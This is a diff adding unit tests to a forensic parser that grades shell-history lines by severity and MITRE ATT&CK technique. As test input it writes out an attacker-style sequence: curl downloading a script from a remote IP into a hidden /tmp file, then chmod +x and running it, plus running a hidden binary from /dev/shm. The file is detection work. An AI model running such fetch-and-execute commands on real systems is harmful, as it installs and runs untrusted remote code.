@@ -122,6 +122,35 @@ describe("parseShellHistoryFile — classification + IOCs", () => {
     expect(cleanup?.mitreTechniques).toContain("T1070.004");
   });
 
+  // The fetch was already graded Low (ingress tool transfer), but the line that actually RAN the
+  // payload matched nothing and stayed Info — and Info never reaches the forensic timeline, so a
+  // synthesis pass could see the download and not the execution. #877.
+  it("grades running a payload staged in a world-writable directory above Info", () => {
+    const triad = ["curl -s http://203.0.113.10/stage1.sh -o /tmp/.x", "chmod +x /tmp/.x && /tmp/.x"].join(
+      "\n",
+    );
+    const r = parseShellHistoryFile(triad, { user: "svc" });
+
+    const fetch = r.events.find((e) => /curl -s/.test(e.description));
+    expect(fetch?.severity).toBe("Low");
+    const exec = r.events.find((e) => /chmod \+x/.test(e.description));
+    expect(exec?.severity).toBe("Medium");
+    expect(exec?.mitreTechniques).toContain("T1222.002");
+    expect(exec?.mitreTechniques).toContain("T1059.004");
+  });
+
+  it("grades bare execution of a world-writable path above Info", () => {
+    const r = parseShellHistoryFile("/dev/shm/.update --daemon", { user: "svc" });
+    expect(r.events[0]?.severity).toBe("Medium");
+    expect(r.events[0]?.mitreTechniques).toContain("T1059.004");
+  });
+
+  it("leaves an ordinary chmod +x on a normal path alone", () => {
+    // The tagger is deliberately conservative: flagging every chmod +x would bury the signal.
+    const r = parseShellHistoryFile("chmod +x ./deploy.sh", { user: "dev" });
+    expect(r.events[0]?.severity).toBe("Info");
+  });
+
   it("keeps the worse of the two tables when both fire", () => {
     // CMD_RULES grades history-tampering High; the shared table grades it strong (also High). The
     // union of techniques must survive, and a High from either side must not be softened to Medium.
